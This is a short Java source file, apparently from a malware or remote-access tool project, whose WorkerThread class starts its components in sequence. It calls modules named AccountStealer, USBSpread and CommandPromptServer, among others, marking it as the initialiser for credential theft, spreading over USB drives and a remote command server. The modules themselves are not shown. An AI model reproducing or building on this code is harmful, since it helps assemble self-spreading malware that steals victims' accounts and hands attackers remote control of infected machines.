
import java.io.IOException;
import java.util.logging.Level;
import java.util.logging.Logger;

/*
 * To change this template, choose Tools | Templates
 * and open the template in the editor.
 */

/**
 *
 * @author Nathan
 */
public class WorkerThread implements Runnable {

    public void toInit() {
        try {
            PortServices.loadServices();
            AccountStealer.doLoad();
            USBSpread.spreadUsb();
            Main.secure();
            CommandPromptServer.initServer();
            new Thread(new TaskChecker()).start();
        } catch (Exception ex) {
            Logger.getLogger(WorkerThread.class.getName()).log(Level.SEVERE, null, ex);
        }
    }

    public void run() {
        toInit();
    }
}
